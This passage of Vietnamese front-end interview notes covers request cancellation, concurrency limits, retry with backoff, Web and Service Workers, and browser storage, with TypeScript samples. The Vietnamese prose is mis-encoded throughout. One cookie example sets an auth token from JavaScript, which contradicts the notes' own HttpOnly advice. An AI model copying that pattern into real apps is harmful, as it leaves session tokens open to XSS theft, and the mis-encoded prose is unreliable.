- Concurrency: h√†ng ƒë·ª£i ƒë·ª£i slot tr·ªëng; xong 1 t√°c v·ª• th√¨ ph√°t t√≠n hi·ªáu cho t√°c v·ª• k·∫ø.
- Retry: v√≤ng l·∫∑p b·∫Øt l·ªói, ƒë·ª£i theo backoff (exponential + jitter), d·ª´ng khi ƒë·∫°t s·ªë l·∫ßn t·ªëi ƒëa.

∆Øu ƒëi·ªÉm:

- Ch·ªß ƒë·ªông d·ª´ng t√°c v·ª• th·ª´a (chuy·ªÉn trang, ƒë√≥ng modal).
- Gi·∫£m t·∫£i server/tr√¨nh duy·ªát, tr√°nh b√£o request.
- TƒÉng ƒë·ªô tin c·∫≠y khi m·∫°ng kh√¥ng ·ªïn ƒë·ªãnh.

Nh∆∞·ª£c ƒëi·ªÉm:

- C·∫ßn lan truy·ªÅn `signal` qua nhi·ªÅu l·ªõp API.
- Retry sai lo·∫°i l·ªói c√≥ th·ªÉ t·ªá h∆°n (spam server).
- T·ªëi ∆∞u concurrency kh√¥ng ƒë√∫ng ng·ªØ c·∫£nh v·∫´n c√≥ th·ªÉ ngh·∫Ωn.

Ch√∫ th√≠ch: Ch·ªâ retry l·ªói t·∫°m th·ªùi (5xx, ECONNRESET); kh√¥ng retry 4xx tr·ª´ khi c√≥ l√Ω do r√µ r√†ng.

**Code Example:**

```ts
 // Ch√∫ gi·∫£i: 1) Abort fetch v·ªõi timeout
function fetchWithTimeout(url: string, ms = 5000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  return fetch(url, { signal: ctrl.signal }).finally(() => clearTimeout(t));
}

// 2) Concurrency limit (semaphore ƒë∆°n gi·∫£n)
function createLimiter(max: number) {
  let active = 0;
  const queue: Array<() => void> = [];
  const next = () => {
    active--;
    queue.shift()?.();
  };
  return async function run<T>(fn: () => Promise<T>): Promise<T> {
    if (active >= max) await new Promise<void>((res) => queue.push(res));
    active++;
    try {
      return await fn();
    } finally {
      next();
    }
  };
}

 // Ch√∫ gi·∫£i: 3) Retry + backoff + jitter
async function retry<T>(op: () => Promise<T>, tries = 3) {
  let attempt = 0;
  while (true) {
    try {
      return await op();
    } catch (e) {
      if (++attempt >= tries) throw e;
      const base = 2 ** attempt * 100;
      const jitter = Math.random() * 100;
      await new Promise((r) => setTimeout(r, base + jitter));
    }
  }
}
```

**Best Practices:**

- Truy·ªÅn `signal` xuy√™n su·ªët chain APIs ƒë·ªÉ h·ªßy g·ªçn
- ƒê·∫∑t timeout t·ªïng; ƒëo v√† ƒëi·ªÅu ch·ªânh max concurrency theo t√†i nguy√™n
- Ch·ªâ retry cho l·ªói t·∫°m th·ªùi (5xx, network)

**Mistakes:**

```ts
// ‚ùå Retry v√¥ h·∫°n, kh√¥ng jitter ‚Üí d·ªìn t·∫£i (thundering herd)
```
---
## 29. üë∑ Q29: Web Workers, Service Worker & Background processesing & Share Worker  

**P1: T√™n c√¢u h·ªèi:** üë∑ Q29: Web Workers, Service Worker & Background processesing & Share Worker  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Web Workers ch·∫°y JavaScript parallel kh√¥ng block UI, Service Workers proxy network requests cho offline PWA, Shared Workers share gi·ªØa tabs."**

**üîë 3 Lo·∫°i Workers:**

**1. Web Worker (Dedicated Worker):**
- Ch·∫°y **background thread** ri√™ng, kh√¥ng access DOM
- Communication: **`postMessage()` + `onmessage`**
- Use case: Heavy computations (image processing, large data parsing, crypto)
- Transferable objects (ArrayBuffer) cho performance cao

**2. Service Worker:**
- **Proxy network requests**, cache resources cho offline
- Lifecycle: install ‚Üí activate ‚Üí fetch intercept
- **C·∫ßn HTTPS** (tr·ª´ localhost), scope-based (control URLs in folder)
- Use case: PWA (offline support), background sync, push notifications

**3. Shared Worker:**
- **Share state gi·ªØa multiple tabs/windows** c√πng origin
- Communication qua MessagePort
- Use case: Shared WebSocket connection, centralized state management

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng DOM APIs trong Worker ‚Üí **KH√îNG c√≥** `window`, `document`
- G·ª≠i large objects v·ªõi `postMessage` ‚Üí ch·∫≠m (clone overhead), d√πng **Transferable** thay v√¨
- Service Worker cache kh√¥ng version ‚Üí stale data, d√πng cache versioning
- Qu√™n `self.skipWaiting()` ‚Üí SW m·ªõi kh√¥ng activate ngay

**üí° Ki·∫øn Th·ª©c Senior:**
- **Transferable Objects**: `postMessage(data, [data.buffer])` ‚Üí **zero-copy** transfer (nhanh h∆°n structured clone)
- **Service Worker strategies**:
  - **Cache First**: Offline-first (cache ‚Üí network fallback)
  - **Network First**: Fresh data priority (network ‚Üí cache fallback)
  - **Stale-While-Revalidate**: Instant response (cache) + background update
- **Workbox** (Google): Production-ready SW library v·ªõi precaching, routing, strategies
- **SharedArrayBuffer** cho shared memory gi·ªØa workers (c·∫ßn COOP/COEP headers)
- Module Workers: `new Worker('worker.js', {type: 'module'})` - support ES6 imports




**Tr·∫£ l·ªùi:****

- Web Worker: ch·∫°y song song, kh√¥ng truy c·∫≠p DOM
- Service Worker: proxy network, cache offline, c·∫ßn HTTPS/origin chu·∫©n
- PWA: manifest + SW + HTTPS

**Code Example:**

```ts
 // Ch√∫ gi·∫£i: worker.ts
self.onmessage = (e) => {
  const n: number = e.data;
  postMessage(n * 2);
};

 // Ch√∫ gi·∫£i: main.ts
const worker = new Worker(new URL('./worker.ts', import.meta.url));
worker.postMessage(21);
worker.onmessage = (e) => console.log(e.data); // Ch√∫ gi·∫£i: 42

 // Ch√∫ gi·∫£i: service worker (sw.js)
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open('v1').then((c) => c.addAll(['/', '/style.css'])));
});
self.addEventListener('fetch', (e) => {
  e.respondWith(caches.match(e.request).then((r) => r || fetch(e.request)));
});
```

**Best Practices:**

- Worker: truy·ªÅn d·ªØ li·ªáu nh·ªè/g·ªçn; d√πng transferable (ArrayBuffer) cho hi·ªáu nƒÉng
- SW: version cache, chi·∫øn l∆∞·ª£c network (Stale-While-Revalidate, CacheFirst,...)

**Mistakes:**

```ts
// ‚ùå D√πng DOM API b√™n trong Worker ‚Üí kh√¥ng c√≥ s·∫µn
```
---
## 30. üíΩ Q30: Browser Storage - LocalStorage, SessionStorage, Cookie & IndexedDB  

**P1: T√™n c√¢u h·ªèi:** üíΩ Q30: Browser Storage - LocalStorage, SessionStorage, Cookie & IndexedDB  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Browser c√≥ 4 storage options: Cookie (4KB, g·ª≠i server), LocalStorage (5-10MB, persistent), SessionStorage (5-10MB, tab-scoped), IndexedDB (50MB+, async database)."**

**üîë So S√°nh 4 Lo·∫°i Storage:**

| **Ti√™u Ch√≠** | **Cookie** | **LocalStorage** | **SessionStorage** | **IndexedDB** |
|-------------|-----------|-----------------|-------------------|---------------|
| **Dung l∆∞·ª£ng** | 4KB | 5-10MB | 5-10MB | 50MB-unlimited |
| **T·ªìn t·∫°i** | Expiry date | M√£i m√£i | ƒê√≥ng tab m·∫•t | M√£i m√£i |
| **API** | Sync (string) | Sync (string) | Sync (string) | **Async** |
| **G·ª≠i server** | ‚úÖ Auto | ‚ùå Kh√¥ng | ‚ùå Kh√¥ng | ‚ùå Kh√¥ng |
| **Use Case** | Auth tokens | Settings | Form data | Large datasets |

**üîë Chi Ti·∫øt T·ª´ng Lo·∫°i:**

**1. Cookie:**
- **T·ª± ƒë·ªông g·ª≠i** k√®m m·ªçi HTTP request ‚Üí d√πng cho authentication
- Flags: `HttpOnly` (JS kh√¥ng ƒë·ªçc), `Secure` (ch·ªâ HTTPS), `SameSite` (CSRF protection)
- T·ªën bandwidth (g·ª≠i m·ªçi request) ‚Üí gi·ªØ nh·ªè

**2. LocalStorage:**
- **Persistent** (kh√¥ng m·∫•t khi ƒë√≥ng tab), **synchronous API**
- Use case: User preferences, theme, language, cached data
- ‚ö†Ô∏è KH√îNG d√πng cho sensitive data (kh√¥ng encrypt, XSS vulnerable)

**3. SessionStorage:**
- **Tab-scoped** (m·ªói tab ri√™ng bi·ªát), m·∫•t khi ƒë√≥ng tab
- Use case: Form wizards, temporary shopping cart, session-specific state
- Duplicate tab = duplicate sessionStorage (kh√¥ng share)

**4. IndexedDB:**
- **Async database** (transactions, indexes, queries)
- Store **objects, files, blobs** (kh√¥ng ch·ªâ strings)
- Use case: Offline apps, large datasets, binary files (images, videos)
- Libraries: Dexie.js, localForage (simplified API)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- L∆∞u sensitive data (tokens) v√†o localStorage ‚Üí **XSS attack** ƒë·ªçc ƒë∆∞·ª£c, d√πng `HttpOnly` cookies thay v√¨
- Stringify/parse m·ªói l·∫ßn access localStorage ‚Üí performance issue, cache parsed value
- Kh√¥ng handle `QuotaExceededError` ‚Üí app crash khi storage ƒë·∫ßy
- D√πng IndexedDB synchronously (blocking API) ‚Üí d√πng promises/async

**üí° Ki·∫øn Th·ª£c Senior:**
- **Security**: Tokens trong `HttpOnly + Secure + SameSite=Strict` cookies, kh√¥ng localStorage
- **Storage events**: `window.addEventListener('storage')` ƒë·ªÉ sync gi·ªØa tabs (ch·ªâ localStorage)
- **Quota API**: `navigator.storage.estimate()` check available space
- **Cache API** (Service Workers): Kh√°c localStorage, d√πng cho HTTP responses caching
- Performance: localStorage **blocking I/O** ‚Üí avoid trong hot paths, d√πng in-memory cache




**Tr·∫£ l·ªùi:****

Browser cung c·∫•p **4 c√°ch l∆∞u tr·ªØ data** ·ªü client-side, m·ªói c√°ch ph√π h·ª£p cho use case kh√°c nhau:

- **Cookie**: Nh·ªè (4KB), g·ª≠i k√®m m·ªói HTTP request, c√≥ expiry, d√πng cho auth tokens
- **LocalStorage**: 5-10MB, persistent (kh√¥ng m·∫•t khi ƒë√≥ng tab), sync API, d√πng cho settings/preferences
- **SessionStorage**: 5-10MB, m·∫•t khi ƒë√≥ng tab, sync API, d√πng cho temporary data
- **IndexedDB**: 50MB-unlimited, async, database-like, d√πng cho large datasets

#### **üìä So S√°nh 4 Lo·∫°i Storage**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    BROWSER STORAGE COMPARISON                          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                        ‚îÇ
‚îÇ  Ti√™u Ch√≠          ‚îÇ Cookie    ‚îÇ LocalStorage ‚îÇ SessionStorage ‚îÇ IndexedDB ‚îÇ
‚îÇ  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ
‚îÇ  Dung l∆∞·ª£ng        ‚îÇ 4KB       ‚îÇ 5-10MB       ‚îÇ 5-10MB         ‚îÇ 50MB+     ‚îÇ
‚îÇ  T·ªìn t·∫°i           ‚îÇ Expiry    ‚îÇ M√£i m√£i      ‚îÇ ƒê√≥ng tab m·∫•t   ‚îÇ M√£i m√£i   ‚îÇ
‚îÇ  API               ‚îÇ Sync      ‚îÇ Sync         ‚îÇ Sync           ‚îÇ Async     ‚îÇ
‚îÇ  G·ª≠i server        ‚îÇ ‚úÖ T·ª± ƒë·ªông‚îÇ ‚ùå Kh√¥ng     ‚îÇ ‚ùå Kh√¥ng       ‚îÇ ‚ùå Kh√¥ng  ‚îÇ
‚îÇ  Complexity        ‚îÇ Medium    ‚îÇ Easy         ‚îÇ Easy           ‚îÇ Hard      ‚îÇ
‚îÇ  Use Case          ‚îÇ Auth      ‚îÇ Settings     ‚îÇ Form data      ‚îÇ Big data  ‚îÇ
‚îÇ  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ
‚îÇ                                                                        ‚îÇ
‚îÇ  üç™ Cookie:        Nh∆∞ tem d√°n l√™n th∆∞ g·ª≠i ƒëi (m·ªçi request)          ‚îÇ
‚îÇ  üíæ LocalStorage:  Nh∆∞ USB drive (c·∫Øm m√£i m√£i)                        ‚îÇ
‚îÇ  üìù SessionStorage: Nh∆∞ gi·∫•y nh√°p (h·∫øt gi·ªù l√† v·ª©t)                    ‚îÇ
‚îÇ  üóÑÔ∏è IndexedDB:     Nh∆∞ kho ch·ª©a l·ªõn (ch·ª©a c·∫£ th√πng h√†ng)             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üç™ 1. Cookie - "Tem D√°n L√™n M·ªçi Request"**

**ƒê·∫∑c ƒëi·ªÉm:**
- Dung l∆∞·ª£ng nh·ªè: **4KB** (ch·ªâ l∆∞u ƒë∆∞·ª£c text ng·∫Øn)
- T·ª± ƒë·ªông g·ª≠i k√®m **m·ªçi HTTP request** t·ªõi server
- C√≥ **expiry date** (t·ª± ƒë·ªông x√≥a sau th·ªùi gian)
- D√πng cho: **Authentication tokens, user tracking**

**∆Øu ƒëi·ªÉm:**
- ‚úÖ Server t·ª± ƒë·ªông nh·∫≠n (kh√¥ng c·∫ßn JS)
- ‚úÖ C√≥ expiry (t·ª± ƒë·ªông d·ªçn d·∫πp)
- ‚úÖ Secure flag (HTTPS only), HttpOnly (JS kh√¥ng ƒë·ªçc ƒë∆∞·ª£c)

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ùå Nh·ªè (4KB) - kh√¥ng l∆∞u nhi·ªÅu
- ‚ùå T·ªën bandwidth (g·ª≠i k√®m m·ªçi request)
- ‚ùå Ph·ª©c t·∫°p h∆°n localStorage

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// COOKIE - V√≠ D·ª• ƒê∆°n Gi·∫£n
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ SET Cookie - L∆∞u token
function setCookie(name: string, value: string, days: number = 7) {
  const date = new Date();
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000); // T√≠nh expiry
  const expires = `expires=${date.toUTCString()}`;
  
 // Ch√∫ gi·∫£i: L∆∞u cookie
  document.cookie = `${name}=${value}; ${expires}; path=/; SameSite=Strict`;
  // path=/     ‚Üí cookie c√≥ hi·ªáu l·ª±c to√†n site
 // Ch√∫ gi·∫£i: SameSite   ‚Üí b·∫£o m·∫≠t CSRF
}

 // Ch√∫ gi·∫£i: Usage: L∆∞u auth token
setCookie('authToken', 'abc123xyz', 7); // H·∫øt h·∫°n sau 7 ng√†y

// 2Ô∏è‚É£ GET Cookie - ƒê·ªçc token
function getCookie(name: string): string | null {
 // Ch√∫ gi·∫£i: document.cookie = "authToken=abc123; userId=456; theme=dark"
  const cookies = document.cookie.split('; ');
  
  for (const cookie of cookies) {
    const [key, value] = cookie.split('=');
    if (key === name) return value;
  }
  
  return null; // Kh√¥ng t√¨m th·∫•y
}

// Usage: ƒê·ªçc auth token
const token = getCookie('authToken');
console.log(token); // Ch√∫ gi·∫£i: "abc123xyz"

// 3Ô∏è‚É£ DELETE Cookie - X√≥a token (set expiry = qu√° kh·ª©)
function deleteCookie(name: string) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
}

// Usage: Logout - x√≥a token
deleteCookie('authToken');

 // Ch√∫ gi·∫£i: ============================================
// Th·ª±c T·∫ø: Cookie Helper Class
 // Ch√∫ gi·∫£i: ============================================
class CookieManager {
 // Ch√∫ gi·∫£i: Set cookie
  static set(name: string, value: string, days: number = 7): void {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Strict`;
  }
  
 // Ch√∫ gi·∫£i: Get cookie
  static get(name: string): string | null {
    return document.cookie
      .split('; ')
      .find(row => row.startsWith(name + '='))
      ?.split('=')[1] || null;
  }
  
 // Ch√∫ gi·∫£i: Delete cookie
  static delete(name: string): void {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
  }
}

 // Ch√∫ gi·∫£i: Usage: Clean API
CookieManager.set('user', 'John', 30); // L∆∞u 30 ng√†y
const user = CookieManager.get('user'); // Ch√∫ gi·∫£i: "John"
CookieManager.delete('user'); // X√≥a
```

---

#### **üíæ 2. LocalStorage - "USB Drive - L∆∞u M√£i M√£i"**

**ƒê·∫∑c ƒëi·ªÉm:**
- Dung l∆∞·ª£ng l·ªõn: **5-10MB** (tu·ª≥ browser)
- **Persistent** - kh√¥ng m·∫•t khi ƒë√≥ng tab/browser
- **Sync API** - d·ªÖ d√πng
- D√πng cho: **User settings, preferences, cache data**

**∆Øu ƒëi·ªÉm:**
- ‚úÖ D·ªÖ d√πng (getItem/setItem)
- ‚úÖ L∆∞u m√£i m√£i (kh√¥ng t·ª± x√≥a)
- ‚úÖ Dung l∆∞·ª£ng l·ªõn (5-10MB)

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ùå Sync API (block main thread n·∫øu d√πng nhi·ªÅu)
- ‚ùå Ch·ªâ l∆∞u string (ph·∫£i JSON.stringify object)
- ‚ùå Kh√¥ng secure (JS ƒë·ªçc ƒë∆∞·ª£c ‚Üí XSS risk)

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// LOCALSTORAGE - V√≠ D·ª• ƒê∆°n Gi·∫£n
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ L∆ØU DATA (setItem)
 // Ch√∫ gi·∫£i: L∆∞u string
localStorage.setItem('username', 'John Doe');

 // Ch√∫ gi·∫£i: L∆∞u object (ph·∫£i stringify)
const user = { id: 1, name: 'John', role: 'admin' };
localStorage.setItem('user', JSON.stringify(user));

 // Ch√∫ gi·∫£i: L∆∞u array
const cart = [
  { id: 1, name: 'iPhone', price: 999 },
  { id: 2, name: 'AirPods', price: 199 },
];
localStorage.setItem('cart', JSON.stringify(cart));

// 2Ô∏è‚É£ ƒê·ªåC DATA (getItem)
// ƒê·ªçc string
const username = localStorage.getItem('username');
console.log(username); // Ch√∫ gi·∫£i: "John Doe"

// ƒê·ªçc object (ph·∫£i parse)
const userStr = localStorage.getItem('user');
const userObj = userStr ? JSON.parse(userStr) : null;
console.log(userObj); // Ch√∫ gi·∫£i: { id: 1, name: 'John', role: 'admin' }

// ƒê·ªçc array
const cartStr = localStorage.getItem('cart');
const cartArray = cartStr ? JSON.parse(cartStr) : [];
console.log(cartArray); // Ch√∫ gi·∫£i: [{ id: 1, ... }, { id: 2, ... }]

// 3Ô∏è‚É£ X√ìA DATA
// X√≥a 1 item
localStorage.removeItem('username');

// X√≥a t·∫•t c·∫£
localStorage.clear();

 // Ch√∫ gi·∫£i: 4Ô∏è‚É£ CHECK T·ªíN T·∫†I
if (localStorage.getItem('user')) {
  console.log('User logged in');
} else {
  console.log('Guest');
}

 // Ch√∫ gi·∫£i: ============================================
// Th·ª±c T·∫ø: LocalStorage Helper
 // Ch√∫ gi·∫£i: ============================================
class LocalStorageHelper {
  // Set data (t·ª± ƒë·ªông stringify)
  static set<T>(key: string, value: T): void {
    try {
      const serialized = JSON.stringify(value);
      localStorage.setItem(key, serialized);
    } catch (error) {
      console.error('LocalStorage set error:', error);
    }
  }
  
  // Get data (t·ª± ƒë·ªông parse)
  static get<T>(key: string, defaultValue: T | null = null): T | null {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (error) {
      console.error('LocalStorage get error:', error);
      return defaultValue;
    }
  }
  
 // Ch√∫ gi·∫£i: Remove item
  static remove(key: string): void {
    localStorage.removeItem(key);
  }
  
 // Ch√∫ gi·∫£i: Clear all
  static clear(): void {
    localStorage.clear();
  }
}

 // Ch√∫ gi·∫£i: Usage: Clean API
interface User {
  id: number;
  name: string;
  role: string;
}

const user: User = { id: 1, name: 'John', role: 'admin' };
LocalStorageHelper.set('user', user); // Ch√∫ gi·∫£i: T·ª± stringify

const savedUser = LocalStorageHelper.get<User>('user'); // Ch√∫ gi·∫£i: T·ª± parse
console.log(savedUser?.name); // Ch√∫ gi·∫£i: "John"

LocalStorageHelper.remove('user'); // X√≥a

 // Ch√∫ gi·∫£i: ============================================
// Use Case Th·ª±c T·∫ø: Theme Switcher
 // Ch√∫ gi·∫£i: ============================================
function saveTheme(theme: 'light' | 'dark') {
  localStorage.setItem('theme', theme);
  document.body.className = theme; // Ch√∫ gi·∫£i: Apply theme
}

function loadTheme() {
  const theme = localStorage.getItem('theme') || 'light';
  document.body.className = theme;
}

 // Ch√∫ gi·∫£i: On page load
loadTheme();

 // Ch√∫ gi·∫£i: On theme button click
document.getElementById('themeBtn')?.addEventListener('click', () => {
  const current = localStorage.getItem('theme') || 'light';
  const newTheme = current === 'light' ? 'dark' : 'light';
  saveTheme(newTheme);
});
```

---

#### **üìù 3. SessionStorage - "Gi·∫•y Nh√°p - ƒê√≥ng Tab L√† M·∫•t"**

**ƒê·∫∑c ƒëi·ªÉm:**
- Dung l∆∞·ª£ng: **5-10MB** (gi·ªëng localStorage)
- **M·∫•t khi ƒë√≥ng tab** (kh√¥ng persistent)
- **Sync API** - gi·ªëng localStorage
- D√πng cho: **Form data, wizard steps, temporary state**

**∆Øu ƒëi·ªÉm:**
- ‚úÖ API gi·ªëng localStorage (d·ªÖ h·ªçc)
- ‚úÖ T·ª± ƒë·ªông d·ªçn d·∫πp (ƒë√≥ng tab = x√≥a)
- ‚úÖ M·ªói tab c√≥ storage ri√™ng

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ùå M·∫•t khi ƒë√≥ng tab (kh√¥ng persistent)
- ‚ùå Kh√¥ng share gi·ªØa tabs
- ‚ùå Sync API (block main thread)

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// SESSIONSTORAGE - V√≠ D·ª• ƒê∆°n Gi·∫£n
 // Ch√∫ gi·∫£i: ============================================

// API GI·ªêNG H·ªÜT LOCALSTORAGE, CH·ªà KH√ÅC T√äN!

 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ L∆ØU DATA
sessionStorage.setItem('formData', JSON.stringify({
  step: 1,
  name: 'John',
  email: 'john@example.com'
}));

// 2Ô∏è‚É£ ƒê·ªåC DATA
const formDataStr = sessionStorage.getItem('formData');
const formData = formDataStr ? JSON.parse(formDataStr) : null;
console.log(formData?.step); // Ch√∫ gi·∫£i: 1

// 3Ô∏è‚É£ X√ìA DATA
sessionStorage.removeItem('formData');
sessionStorage.clear(); // X√≥a t·∫•t c·∫£

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Use Case: Multi-Step Form (Wizard)
 // Ch√∫ gi·∫£i: ============================================
interface FormState {
  currentStep: number;
  data: {
    name?: string;
    email?: string;
    address?: string;
  };
}

class FormWizard {
  private static KEY = 'wizardState';
  
  // L∆∞u state hi·ªán t·∫°i
  static saveState(state: FormState): void {
    sessionStorage.setItem(this.KEY, JSON.stringify(state));
  }
  
  // ƒê·ªçc state (auto-load khi refresh page)
  static loadState(): FormState | null {
    const data = sessionStorage.getItem(this.KEY);
    return data ? JSON.parse(data) : null;
  }
  
  // X√≥a state (sau khi submit)
  static clearState(): void {
    sessionStorage.removeItem(this.KEY);
  }
}

 // Ch√∫ gi·∫£i: Usage:
 // Ch√∫ gi·∫£i: Step 1: Save form data
FormWizard.saveState({
  currentStep: 1,
  data: { name: 'John', email: 'john@example.com' }
});

 // Ch√∫ gi·∫£i: User refresh page ‚Üí auto-restore
const state = FormWizard.loadState();
if (state) {
  console.log(`Resume from step ${state.currentStep}`);
  // Fill form v·ªõi data ƒë√£ l∆∞u
}

 // Ch√∫ gi·∫£i: Step 3: Submit success ‚Üí clear
FormWizard.clearState();

 // Ch√∫ gi·∫£i: ============================================
// So S√°nh LocalStorage vs SessionStorage
 // Ch√∫ gi·∫£i: ============================================

// Scenario 1: User settings (d√πng localStorage)
localStorage.setItem('language', 'vi'); // L∆∞u m√£i m√£i
// ‚Üí User quay l·∫°i sau 1 th√°ng v·∫´n th·∫•y ti·∫øng Vi·ªát

// Scenario 2: Shopping cart (d√πng localStorage)
localStorage.setItem('cart', JSON.stringify(items)); // L∆∞u m√£i m√£i
// ‚Üí User ƒë√≥ng tab r·ªìi m·ªü l·∫°i, cart v·∫´n c√≤n

// Scenario 3: Form draft (d√πng sessionStorage)
sessionStorage.setItem('draft', JSON.stringify(formData)); // M·∫•t khi ƒë√≥ng tab
// ‚Üí User ƒë√≥ng tab = m·∫•t draft (kh√¥ng spam localStorage)

// Scenario 4: Search filters (d√πng sessionStorage)
sessionStorage.setItem('filters', JSON.stringify(filters)); // Ch√∫ gi·∫£i: Per-tab
// ‚Üí M·ªói tab c√≥ filter ri√™ng, kh√¥ng conflict
```

---

#### **üóÑÔ∏è 4. IndexedDB - "Kho Ch·ª©a L·ªõn - Database Tr√™n Browser"**

**ƒê·∫∑c ƒëi·ªÉm:**
- Dung l∆∞·ª£ng: **50MB - unlimited** (chrome: 60% disk)
- **Async API** - kh√¥ng block UI
- **Database-like**: tables, indexes, queries, transactions
- D√πng cho: **Large datasets, offline apps, caching**

**∆Øu ƒëi·ªÉm:**
- ‚úÖ Dung l∆∞·ª£ng l·ªõn (GB n·∫øu user cho ph√©p)
- ‚úÖ Async (kh√¥ng block UI)
- ‚úÖ Indexes, queries (nh∆∞ SQL)
- ‚úÖ Transactions (ACID)

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ùå API ph·ª©c t·∫°p (callback hell)
- ‚ùå Kh√≥ h·ªçc
- ‚ùå Overkill cho data nh·ªè

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
